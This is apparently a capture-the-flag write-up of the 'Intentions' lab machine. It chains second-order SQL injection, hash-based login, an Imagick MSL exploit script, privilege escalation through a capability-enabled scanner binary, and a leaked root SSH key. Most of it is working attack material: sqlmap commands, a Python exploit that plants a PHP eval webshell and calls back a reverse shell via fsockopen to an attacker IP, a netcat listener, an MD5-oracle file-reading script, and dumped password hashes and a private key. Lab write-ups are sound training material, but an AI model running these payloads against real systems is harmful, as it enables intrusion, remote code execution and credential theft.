# Recon
IP : 10.10.11.220 
Level : Hard

~~~
sudo nmap -sCV 10.10.11.220 -p-
~~~

![[Pasted image 20230705124023.png]]

Landing Page :
![[Pasted image 20230705124104.png]]
In URL, i found this Favorite Genres Page,

```
http://10.10.11.220/gallery#/profile
```

![[Pasted image 20230705124542.png]]

![[Pasted image 20230705124720.png]]

If we try to update the genres it looks like this ,
![[Pasted image 20230705124751.png]]

I tried to test some sql payloads it works,
```
{"genres":"food'+SLEEP(1) or '1'='1"}
```

I can see reflection in ``http://10.10.11.220/gallery#/feed``

Which is called as Second order SQL injection..!!

Also when analyzing the request , i found this 

![[Pasted image 20230705131548.png]]

In admin.js
![[Pasted image 20230705131618.png]]

~~~
Hey team, I've deployed the v2 API to production and have started using it in the admin section. \n                Let me know if you spot any bugs. \n                This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text! \n                By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.\n                This should take care of the concerns raised by our users regarding our lack of HTTPS connection.\n
~~~

~~~
The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images. I've included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some
~~~

maybe we have to find hashes? or dump some users using sql injection?

Then go with SQLMAP,

~~~
sqlmap -r genre1.req --second-req feed2.req --batch --technique=BT --dbms=MYSQL --risk=3 --level=5
~~~

Here 

we dumped..!!

```
1       | steve                    | 1       | steve@intentions.htb       | food,travel,nature | $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa | 2023-02-02 17:43:00 | 2023-02-02 17:43:00 |
| 2       | greg                     | 1       | greg@intentions.htb        | food,travel,nature | $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m                             | 2023-02-02 17:44:11 | <blank>             |
       | <blank>                  | 0       | `a                         | <blank>            | <blank>                                                      | <blank>             | 2022                |
| 4       | Camren Ullrich           | <blank> | i                          |  Xfd+ ravel,nature | $2y$10$WkBf7NFjzE5GI5SP7hB5/uA9Bi/BmoNFIUfhBye4gUql/JIc/GTE2 | 100$                | 2023-02-02 18:02:37 |
| 5       | Mr. Lucius Towne I       | 0       | jones.laury@example.com    | food,travel,nature | $2y$10$JembrsnTWIgDZH3vFo1qT.Zf/hbphiPj1vGdVMXCk56icvD6mn/ae | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 6       | Jasen Mosciski           | 0       | wanda93@example.org        | food,travel,nature | $2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 7       | Monique D'Amore          | 0       | mwisoky@example.org        | food,travel,nature | $2y$10$pAMvp3xPODhnm38lnbwPYuZN0B/0nnHyTSMf1pbEoz6Ghjq.ecA7. | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 8       | Desmond Greenfelder      | 0       | lura.zieme@example.org     | food,travel,nature | $2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4/dXv1jnfBVCpaR2h.SDDioy2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 9       | Mrs. Roxanne Raynor      | 0       | pouros.marcus@example.net  | food,travel,nature | $2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3/Kx82hjqbJFMO | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 10      | Rose Rutherford          | 0       | mellie.okon@example.com    | food,travel,nature | $2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx/kpO/XcKw1m | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 11      | Dr. Chelsie Greenholt I  | 0       | trace94@example.net        | food,travel,nature | $2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 12      | Prof. Johanna Ullrich MD | 0       | kayleigh18@example.com     | food,travel,nature | $2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 13      | Prof. Gina Brekke        | 0       | tdach@example.com          | food,travel,nature | $2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2. | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 14      | Jarrett Bayer            | 0       | lindsey.muller@example.org | food,travel,nature | $2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 15      | Macy Walter              | 0       | tschmidt@example.org       | food,travel,nature | $2y$10$01SOJhuW9WzULsWQHspsde3vVKt6VwNADSWY45Ji33lKn7sSvIxIm | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
```

~~~
greg : $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m

steve: $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa
~~~

Now as we said earlier we dont have to crack this password , we can simply login with this by changing 

![[Pasted image 20230705133007.png]]

~~~
/api/v2/auth/user
~~~
when i send the request , i found ,

![[Pasted image 20230705133116.png]]

It asks for the hash field is required,

So now i changed ```password --> hash```  also ```v1 --> v2```


Yes now i got this .. I can login now with the hash .!!

![[Pasted image 20230705133855.png]]

As we now login as steve or greg ..!!!

we are now admin , i dont find anything but ,

This allows us to login as admin and access to ``/admin`` and ``/api/v2/admin/image/modify``

![[Pasted image 20230705135405.png]]

~~~
{"path":"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg",
"effect":"sepia"}
~~~

For further exploitation , i tried ..

Reference Link  for Exploitaiton:

~~~
https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/
~~~

![[Pasted image 20230705140523.png]]

~~~
{"path":"http://<IP>/",
"effect":"sepia"}
~~~

![[can ping.jpg]]

I found this python script and with chatgpt i framed ..!!

Since they used  ``imagick``

~~~
import asyncio
import aiohttp
import requests

headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0```
 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Cookie': 'token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNjg4NDY1NTE5LCJleHAiOjE2ODg0ODcxMTksIm5iZiI6MTY4ODQ2NTUxOSwianRpIjoid1E1VkRYejM2cGU5ZU9oQyIsInN1YiI6IjIiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.KGEyRBU4aZp-sJ581pZQpq2JqPWRBwTkFkAlZdafq3g',
    'Connection': 'close'
}
header2 = {
    "Accept": "*/*",
    "Content-Type": "multipart/form-data; boundary=------------------------c32aaddf3d8fd979"
}
data1 = {
    'path': 'vid:msl:/tmp/php*',
    'effect': 'charcoal'
}

data2 = '''
--------------------------c32aaddf3d8fd979
Content-Disposition: form-data; name="swarm"; filename="swarm.msl"
Content-Type: application/octet-stream
cat 
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="http://10.10.14.19/positive.png" />
<write filename="/var/www/html/intentions/public/a.php" />
</image>
--------------------------c32aaddf3d8fd979--
'''

data3 = {
    'path': 'vid:msl:/var/www/html/intentions/public/index*',
    'effect': 'charcoal'
}

url = 'http://10.10.11.220/'
url1 = url + "api/v2/admin/image/modify"
url2 = url + "a.php"

async def send_requests():
    async with aiohttp.ClientSession(headers=headers) as session:
        tasks = []
        
        for _ in range(30):
            task1 = asyncio.ensure_future(session.post(url1, json=data1))
            tasks.append(task1)

            task2 = asyncio.ensure_future(session.post(url1, headers=header2, data=data2))
            tasks.append(task2)

            task3 = asyncio.ensure_future(session.post(url1, json=data3))
            tasks.append(task3)

        responses = await asyncio.gather(*tasks)
        
        for response in responses:
            print(await response.text())

loop = asyncio.get_event_loop()
loop.run_until_complete(send_requests())
revshell = {
    "a": """$sock=fsockopen("10.10.14.19",9001);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);"""
}
requests.post(url2, data=revshell)
~~~

Before running that we have to start ```python server in port 80```
and the same directory must have a exploit image ..!!

for that ,
~~~
convert xc:red -set 'Copyright' '<?php @eval(@$_REQUEST["a"]); ?>' positive.png
~~~

Now start the server :

~~~
sudo python3 -m http.server 80
~~~

At the same time , 

Dont forget to setup listener,

~~~
nc -lvnp 9001
~~~

Now run the python file :

U can see the logs..!!

![[Pasted image 20230705150048.png]]

![[got shell.jpg]]

Yes got shell.!!!

In that shell i dont found anything special , i roamed everywhere there i see ``git.tar
``(/var/www/html/intentions/.git)

I moved to my Machine by starting python server there and i downloaded.!!

There i found checked git logs and commits..!!

With ```git log``` we see this commit:

commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
Author: greg <greg@intentions.htb>
Date:   Thu Jan 26 09:21:52 2023 +0100

    Test cases did not work on steve's local database, switching to user factory per his advice

Checking it with ```git show f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4```, we get creds for greg, which we can use for ssh.

~~~
greg : Gr3g1sTh3B3stDev3l0per!1998!
~~~

i Logged In through SSH

Got ``user flag

![[userflag.jpg]]

I checked for sudo -l

Installed linpeas.sh

Found , 
``/opt/scanner/scanner

Really i got stucked at this step..!! Asked my friends ..!

They said about getcap...!!

~~~
The `getcap` command is used to display the capabilities of executable files on a Linux system. Capabilities are a way to grant specific privileges to an executable file without giving it full root privileges.
~~~

~~~
getcap /opt/scanner/scanner
~~~

![[Pasted image 20230705154532.png]]

~~~
getcap /opt/scanner/scanner cap_dac_read_search=ep
~~~

My doubt is why the user gave all permission to this file?

My mind said `www-data --> greg --> legal/steven --> root`

It maybe a path..!!

But suddenly i thought `steven --> root`
it will be possible , `because both are in same scanner group.!!

This binary has ```cap_dac_read_search=ep``` capability so it can read any file.
```
greg@intentions:~$ getcap /opt/scanner/scanner 
/opt/scanner/scanner cap_dac_read_search=ep
```

Running it we get the help for it.

It `hashes a file we provide with -c` and `compares it to the hash we provided with -s`, also if we `use the -p flag for the DEBUG, it gives us the hash of the file` we provided.

~~~
import os
import hashlib

def find_character(prefix, md5_hash):
    for char in range(256):
        test_string = prefix + chr(char)
        hashed_string = hashlib.md5(test_string.encode()).hexdigest()
        if hashed_string == md5_hash:
            return chr(char)
    return None

def get_hash(file, length):
    data = os.popen(f"/opt/scanner/scanner -p -s e76884da2fd0ccf43b73c42f22d72e05 -c {file} -l {length}").read()
    data_lines = data.split("\n")
    return data_lines[0].split()[-1]

file = input("File path: ")
content = ""
cont = 1

while True:
    try:
        partial_hash = get_hash(file, cont)
        new_char = find_character(content, partial_hash)
        content += new_char
        cont += 1
    except:
        break

print(os.system("clear"))
print(f"Content of file {file}")
print(content)

~~~

With this we can get literally anything in the machine , since scanner can read everything.!!!

I tried to read `/root/root.txt`

Also got `/root/.ssh/id_rsa`

~~~
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
~~~

Finally, Machine is pwned..!!

